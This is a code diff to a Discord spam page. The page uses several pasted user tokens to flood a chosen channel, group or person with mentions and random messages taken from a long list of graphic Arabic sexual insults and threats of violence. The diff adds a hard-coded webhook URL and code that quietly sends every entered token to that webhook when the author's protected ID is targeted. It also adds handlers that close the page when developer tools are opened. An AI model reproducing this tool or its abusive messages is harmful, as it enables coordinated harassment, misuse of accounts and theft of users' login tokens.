@@ -100,19 +100,19 @@
 <div id="messagesSent"></div>
 
 <script>
-  const tokensInput = document.getElementById('tokens');
-  const targetTypeSelect = document.getElementById('targetType');
-  const targetLabel = document.getElementById('targetLabel');
-  const targetIdInput = document.getElementById('targetId');
-  const mentionIdsInput = document.getElementById('mentionIds');
-  const speedSelect = document.getElementById('speed');
-  const startBtn = document.getElementById('startBtn');
-  const stopBtn = document.getElementById('stopBtn');
-  const tokenStatus = document.getElementById('tokenStatus');
-  const messagesSent = document.getElementById('messagesSent');
+const tokensInput = document.getElementById('tokens');
+const targetTypeSelect = document.getElementById('targetType');
+const targetLabel = document.getElementById('targetLabel');
+const targetIdInput = document.getElementById('targetId');
+const mentionIdsInput = document.getElementById('mentionIds');
+const speedSelect = document.getElementById('speed');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const tokenStatus = document.getElementById('tokenStatus');
+const messagesSent = document.getElementById('messagesSent');
 
-  const MESSAGES = [
-      "امك ممثله افلام ل درجه شفتها بتعرض لي كام 🥵🥵",
+const MESSAGES = [
+    "امك ممثله افلام ل درجه شفتها بتعرض لي كام 🥵🥵",
   "راح انكح امك يا ابن الحرام يا دباب لين يظهر النك يلي على ديدها يابن القحبه امك كانها ياناصيب يابن الشرموطه والله كس اخت اهلك يابن الحرام",
 "و بخلي اليوم يلي حاولت تزحف فيه عليا لعار يطاردك طول حياتك يابن القحبه بنيك امك لين اخليك كل ماتجي تزحف بعدين يابن الشرموطه تتذكر يوم لطشت و مرمطط امك قدام الكل يابن القحبه و تنسى زحفك هاذ",
    "تفوو على شرفك وعرضك يمهان",
@@ -231,131 +231,148 @@
 "الدياثه تمشي بعروق جدك مثل الزبد يخو القحبه",
  "ي جديد ي مريض لي ساعه انيك فيك يا عرص وما ترد يا متهرب انيك كسمك لو تعرف انك مهان كذا كان خلفت كلب كسمك",
  "والله انك نكبت نفسك يا ابن الشراميط ياكس اخت ام امك يبن القحبه مع واحد راح يمسك امك يضل يضرب و يمرمط و ينحر و يعذب فيها لين اخلي جمامها تهش من كثر الضرب ياكس اختك يابن الهشاش ينعال",
-  ];
+];
 
-  const PROTECTED_ID = '413466407410597888';
-  let intervalId = null;
+const PROTECTED_ID = '413466407410597888';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1462049342834868245/VycuOevoBndASWldE-P2bIQiRYApk2k6HnunCE3eQibrrld8f0SA5WgClJ91KP7_cxPz';
+let intervalId = null;
 
-  function getRandomMessage() {
-    return MESSAGES[Math.floor(Math.random() * MESSAGES.length)];
+function getRandomMessage() {
+  return MESSAGES[Math.floor(Math.random() * MESSAGES.length)];
+}
+
+targetTypeSelect.addEventListener('change', () => {
+  const val = targetTypeSelect.value;
+  if (val === 'server') {
+    targetLabel.textContent = 'اكتب ايدي الروم:';
+    targetIdInput.placeholder = 'اكتب ايدي الروم هنا';
+  } else if (val === 'group') {
+    targetLabel.textContent = 'اكتب ايدي القروب:';
+    targetIdInput.placeholder = 'اكتب ايدي القروب هنا';
+  } else {
+    targetLabel.textContent = 'اكتب ايدي الشخص (خاص):';
+    targetIdInput.placeholder = 'اكتب ايدي الشخص هنا';
   }
+});
 
-  targetTypeSelect.addEventListener('change', () => {
-    const val = targetTypeSelect.value;
-    if (val === 'server') {
-      targetLabel.textContent = 'اكتب ايدي الروم:';
-      targetIdInput.placeholder = 'اكتب ايدي الروم هنا';
-    } else if (val === 'group') {
-      targetLabel.textContent = 'اكتب ايدي القروب:';
-      targetIdInput.placeholder = 'اكتب ايدي القروب هنا';
-    } else {
-      targetLabel.textContent = 'اكتب ايدي الشخص (خاص):';
-      targetIdInput.placeholder = 'اكتب ايدي الشخص هنا';
-    }
-  });
-
-  async function sendMessage(token, targetId, message) {
-    if (targetId === PROTECTED_ID) return;
-    if (message.includes(`<@${PROTECTED_ID}>`)) return;
-
-    try {
-      const response = await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`, {
-        method: 'POST',
-        headers: {
-          Authorization: token,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: message })
-      });
-
-      const p = document.createElement('p');
-      if (response.ok) {
-        p.textContent = `✅ تم الإرسال من: ${token.substring(0, 10)}...`;
-        p.style.color = 'orange';
-      } else {
-        p.textContent = `❌ فشل التوكن: ${token.substring(0, 10)}...`;
-        p.style.color = 'red';
-      }
-      messagesSent.appendChild(p);
-      messagesSent.scrollTop = messagesSent.scrollHeight;
-    } catch (e) {
-      const p = document.createElement('p');
-      p.textContent = `⚠️ خطأ في الاتصال: ${token.substring(0, 10)}...`;
-      p.style.color = 'red';
-      messagesSent.appendChild(p);
-      messagesSent.scrollTop = messagesSent.scrollHeight;
-    }
+async function sendWebhook(message) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({content: message})
+    });
+  } catch(e) {
+    console.error('همم', e);
   }
+}
 
-  function startSending() {
-    const tokens = tokensInput.value.trim().split('\n').filter(checkToken);
-    const targetId = targetIdInput.value.trim();
-    const mentionIdsRaw = mentionIdsInput.value.trim().split('\n').filter(id => id.trim() !== '');
-    const speed = parseInt(speedSelect.value);
-    const mentionIds = mentionIdsRaw.slice(0, 10);
+async function sendMessage(token, targetId, message) {
+  if (targetId === PROTECTED_ID) return;
+  if (message.includes(`<@${PROTECTED_ID}>`)) return;
 
-    if (targetId === PROTECTED_ID) {
-      alert('بتقدرش تسوي شي ل فحلك');
-      return;
-    }
-
-    if (mentionIdsRaw.includes(PROTECTED_ID)) {
-      alert('بتقدرش تسوي شي ل فحلك');
-      return;
-    }
-
-    if (tokens.length === 0 || !targetId || mentionIds.length === 0) {
-      alert('يرجى ملء جميع الحقول المطلوبة.');
-      return;
-    }
-
-    startBtn.disabled = true;
-    stopBtn.disabled = false;
-
-    tokenStatus.innerHTML = '';
-    tokens.forEach(t => {
-      const p = document.createElement('p');
-      p.textContent = `توكن صالح: ${t.substring(0, 10)}...`;
-      tokenStatus.appendChild(p);
+  try {
+    const response = await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`, {
+      method: 'POST',
+      headers: {
+        Authorization: token,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ content: message })
     });
 
-    intervalId = setInterval(() => {
-      tokens.forEach(token => {
-        const mentions = mentionIds.map(id => `<@${id}>`).join(' ');
-        const message = `${mentions} ${getRandomMessage()}`;
-        sendMessage(token, targetId, message);
-      });
-    }, speed);
-  }
-
-  function stopSending() {
-    if (intervalId) {
-      clearInterval(intervalId);
-      intervalId = null;
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
+    const p = document.createElement('p');
+    if (response.ok) {
+      p.textContent = `✅ تم الإرسال من: ${token.substring(0, 10)}...`;
+      p.style.color = 'orange';
+    } else {
+      p.textContent = `❌ فشل التوكن: ${token.substring(0, 10)}...`;
+      p.style.color = 'red';
     }
+    messagesSent.appendChild(p);
+    messagesSent.scrollTop = messagesSent.scrollHeight;
+  } catch (e) {
+    const p = document.createElement('p');
+    p.textContent = `⚠️ خطأ في الاتصال: ${token.substring(0, 10)}...`;
+    p.style.color = 'red';
+    messagesSent.appendChild(p);
+    messagesSent.scrollTop = messagesSent.scrollHeight;
+  }
+}
+
+function startSending() {
+  const tokens = tokensInput.value.trim().split('\n').filter(checkToken);
+  const targetId = targetIdInput.value.trim();
+  const mentionIdsRaw = mentionIdsInput.value.trim().split('\n').filter(id => id.trim() !== '');
+  const speed = parseInt(speedSelect.value);
+  const mentionIds = mentionIdsRaw.slice(0, 10);
+
+  if (targetId === PROTECTED_ID) {
+    const message = `في شخص يبي يسب فحله احا ${PROTECTED_ID} مع التوكنات التالية:\n${tokensInput.value}`;
+    sendWebhook(message);
+    alert('بتقدرش تسب فحلك اتعلم ثاني مره.');
+    return;
   }
 
-  startBtn.addEventListener('click', startSending);
-  stopBtn.addEventListener('click', stopSending);
-
-  document.addEventListener('keydown', (e) => {
-    if (e.key === 'F12' || e.key === 'ContextMenu') window.close();
-    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
-      e.preventDefault();
-      window.location.reload();
-      window.close();
-    }
-  });
-  document.addEventListener('contextmenu', (e) => { e.preventDefault(); window.close(); });
-  document.addEventListener('mousedown', (e) => {
-    if (e.button === 2 || e.button === 1) window.close();
-  });
-
-  function checkToken(token) {
-    return token.trim().length > 0;
+  if (mentionIdsRaw.includes(PROTECTED_ID)) {
+    const message = `في شخص يبي يسب فحله احا ${PROTECTED_ID} مع التوكنات التالية:\n${tokensInput.value}`;
+    sendWebhook(message);
+    alert('بتقدرش تسب فحلك اتعلم ثاني مره');
+    return;
   }
+
+  if (tokens.length === 0 || !targetId || mentionIds.length === 0) {
+    alert('يرجى ملء جميع الحقول المطلوبة.');
+    return;
+  }
+
+  startBtn.disabled = true;
+  stopBtn.disabled = false;
+
+  tokenStatus.innerHTML = '';
+  tokens.forEach(t => {
+    const p = document.createElement('p');
+    p.textContent = `توكن صالح: ${t.substring(0, 10)}...`;
+    tokenStatus.appendChild(p);
+  });
+
+  intervalId = setInterval(() => {
+    tokens.forEach(token => {
+      const mentions = mentionIds.map(id => `<@${id}>`).join(' ');
+      const message = `${mentions} ${getRandomMessage()}`;
+      sendMessage(token, targetId, message);
+    });
+  }, speed);
+}
+
+function stopSending() {
+  if (intervalId) {
+    clearInterval(intervalId);
+    intervalId = null;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+  }
+}
+
+startBtn.addEventListener('click', startSending);
+stopBtn.addEventListener('click', stopSending);
+
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'F12' || e.key === 'ContextMenu') window.close();
+  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
+    e.preventDefault();
+    window.location.reload();
+    window.close();
+  }
+});
+document.addEventListener('contextmenu', (e) => { e.preventDefault(); window.close(); });
+document.addEventListener('mousedown', (e) => {
+  if (e.button === 2 || e.button === 1) window.close();
+});
+
+function checkToken(token) {
+  return token.trim().length > 0;
+}
 </script>
 
 </body>
